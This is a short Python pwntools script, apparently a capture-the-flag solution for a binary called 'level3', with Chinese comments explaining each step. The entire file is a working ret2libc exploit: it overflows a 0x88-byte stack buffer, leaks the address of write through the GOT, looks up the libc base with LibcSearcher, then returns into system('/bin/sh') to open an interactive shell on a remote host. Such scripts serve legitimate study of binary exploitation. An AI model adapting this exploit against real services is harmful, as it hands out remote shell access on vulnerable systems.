#!usr/bin/python
#coding=utf-8

from pwn import *
from LibcSearcher import *
# context.log_level = "debug"

io = remote("111.198.29.45",48239)
# io = process("./level3")

elf = ELF("./level3")

read_plt = elf.plt["read"]
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]

io.recv()

payload  = "a" * 0x88
payload += p32(0xdeadbeef) 
payload += p32(write_plt)
payload += p32(main_addr)
payload += p32(1)
payload += p32(write_got)    #write(1, addr, 4)从addr开始读取4个字节数据，泄露write在程序中的真实地址
payload += p32(4)

io.sendline(payload)

write_leak = u32(io.recv()[:4])
print "write_leak ==> " + hex(write_leak)

libc = LibcSearcher('write', write_leak)
libc_base = write_leak - libc.dump('write')    #libc.dump()获取write在libc中的地址，从而计算偏移量
print "libc_base ==> " + hex(libc_base)

sys_addr = libc_base + libc.dump("system")    #获取函数在libc中的真实地址
print "sys_addr ==> " + hex(sys_addr)

#libc_binsh = libc.search("/bin/sh").next()
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
print "bin_sh_addr ==> " + hex(bin_sh_addr)

io.recv()

payload2  = "a" * 0x88 + p32(0xdeadbeef)
payload2 += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

io.sendline(payload2)

io.interactive()
